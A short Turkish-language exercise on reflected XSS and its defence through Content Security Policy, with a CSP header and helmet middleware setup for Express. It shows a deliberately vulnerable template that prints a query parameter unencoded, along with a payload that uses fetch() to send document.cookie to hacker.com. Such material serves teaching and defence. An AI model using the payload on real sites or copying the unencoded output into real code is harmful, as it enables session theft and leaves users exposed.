# Gorev 03: XSS ve CSP Koruması

## 1. Zafiyetli XSS (Reflected)
Kullanıcıdan gelen mesajı encode etmeden ekrana basan kod:

```html
<!-- index.html -->
<div>
    Mesajınız: <%= request.query.message %> 
</div>
```
**Payload:** `?message=<script>fetch('https://hacker.com/steal?cookie=' + document.cookie)</script>`

## 2. Savunma: Content Security Policy (CSP)
Sunucu tarafında HTTP header'ı olarak CSP eklenmelidir.

```javascript
// CSP Header Örneği
res.setHeader("Content-Security-Policy", "default-src 'self'; script-src 'self'; object-src 'none';");
```
Bu header eklendiğinde:
*   Inline scriptler (`<script>...</script>`) çalışmaz.
*   Dış kaynaklardan (`hacker.com`) script yüklenemez.
*   `eval()` fonksiyonu engellenir.

## 3. Helmet ile Uygulama
Node.js Express üzerinde A+ güvenliği için:

```javascript
const helmet = require('helmet');
app.use(helmet.contentSecurityPolicy({
    useDefaults: true,
    directives: {
        "script-src": ["'self'", "trusted-scripts.com"],
        "style-src": ["'self'", "'unsafe-inline'"],
    },
}));
```

## 4. Test ve Analiz
1.  CSP kapalıyken `alert(1)` payloadı çalışır.
2.  CSP açıkken tarayıcı konsolunda `Refused to execute inline script because it violates the following Content Security Policy directive...` hatası görülür.
